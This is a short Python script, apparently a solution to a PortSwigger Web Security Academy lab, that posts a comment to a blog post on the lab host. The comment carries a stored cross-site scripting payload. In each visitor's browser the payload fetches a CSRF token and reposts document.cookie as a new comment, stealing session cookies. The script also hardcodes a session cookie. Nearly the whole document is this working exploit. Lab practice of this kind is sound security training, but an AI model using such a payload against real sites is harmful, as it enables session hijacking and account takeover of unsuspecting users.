import requests
import re

url='https://0a8400eb04cd14b280dd12f1002300b4.web-security-academy.net/post?postId='

getPostId='9'
session=requests.session()

cookie={
    "session":"A6BTmJYZkZsGln1VR1nlGpUMymDhn4iu"
}

csrf_response = session.get(url+getPostId,cookies=cookie)

pattern=r'name="csrf" value="(.*?)"'

match_data = re.findall(pattern,csrf_response.text)[0]

js_payload=r"<script>var req=new XMLHttpRequest();req.onload=function(){var token=this.responseXML.getElementsByName('csrf')[0].value;var req2=new XMLHttpRequest();req2.open('POST','/post/comment',true);req2.setRequestHeader('Content-type','application/x-www-form-urlencoded');req2.send('csrf='+token+'&postId=4&comment='+document.cookie+'&name=pwned&email=x@x.com&website=http://x.com');};req.open('GET','/post?postId=7');req.responseType='document';req.send();</script>"

data_to_send={
    "csrf":match_data,
    "postId":getPostId,
    "comment":js_payload,
    "name":"siwarat",
    "email":"test@example.com",
    "website":"www.google.com"
}

response=session.post('https://0a8400eb04cd14b280dd12f1002300b4.web-security-academy.net/post?postId=9',data=data_to_send,cookies=cookie)
print(response.text)

